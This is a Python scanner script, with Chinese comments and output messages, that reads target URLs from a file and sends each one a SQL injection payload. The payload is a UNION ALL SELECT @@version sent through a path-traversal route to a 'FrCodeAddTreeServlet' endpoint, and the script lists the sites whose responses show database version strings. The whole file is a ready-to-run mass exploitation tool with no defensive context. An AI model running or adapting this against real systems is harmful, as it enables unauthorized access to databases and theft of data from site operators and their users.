import http.client
from colorama import Fore, Style
import colorama
colorama.init()

# ANSI转义序列
RED = "\033[91m"
WHITE = "\033[0m"

def read_urls_from_file(filename):
    urls = []
    with open(filename, 'r') as file:
        for line in file:
            urls.append(line.strip())
    return urls

def send_request(url, vulnerable_urls):
    try:
        # 解析 URL
        url_parts = url.split("/")
        host = url_parts[2]
        path = "/templates/attestation/../../servlet/FrCodeAddTreeServlet"
        # 构造 payload
        payload = "params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1' UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL-- fNwL&treetype=&orgtype="
        # 发送 POST 请求
        conn = http.client.HTTPConnection(host)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Host": host,
            "Content-type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(payload))
        }
        conn.request("POST", path, payload, headers)
        # 获取响应
        response = conn.getresponse()
        # 读取响应内容
        response_content = response.read().decode("utf-8")
        # 关闭连接
        conn.close()
        return response_content
    except http.client.RemoteDisconnected as e:
        print(f"[-] {url}: 远程主机强迫关闭了一个现有的连接")
        return None
    except http.client.HTTPException as e:
        print(f"[-] {url}: 由于目标计算机积极拒绝，无法连接")
        return None
    except TimeoutError as e:
        print(f"[-] URL {url}: 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败")
        return None
    except Exception as e:
        raise e

def check_response(response, url):
    keywords = ["SQL",  "Microsoft", "SP", "X86"]
    for keyword in keywords:
        if keyword in response:
            return True
    return False

if __name__ == "__main__":
    vulnerable_urls = []
    urls = read_urls_from_file('url.txt')
    for url in urls:
        try:
            response = send_request(url, vulnerable_urls)
            if response is None:
                continue
            if check_response(response, url):
                print(Fore.RED + f"URL {url} 报告发现FrCodeAddTreeServlet注入" + Style.RESET_ALL)
                vulnerable_urls.append(url)
            else:
                print(Fore.GREEN + f"URL {url} 貌似不存在，换个姿势尝试" + Style.RESET_ALL)
        except Exception as e:
            print(f"[-] {url}: {e}")

    # 输出存在漏洞的 URL 统计
    print(Fore.RED + f"\n存在漏洞的URL:" + Style.RESET_ALL)
    for vulnerable_url in vulnerable_urls:
        print(vulnerable_url)
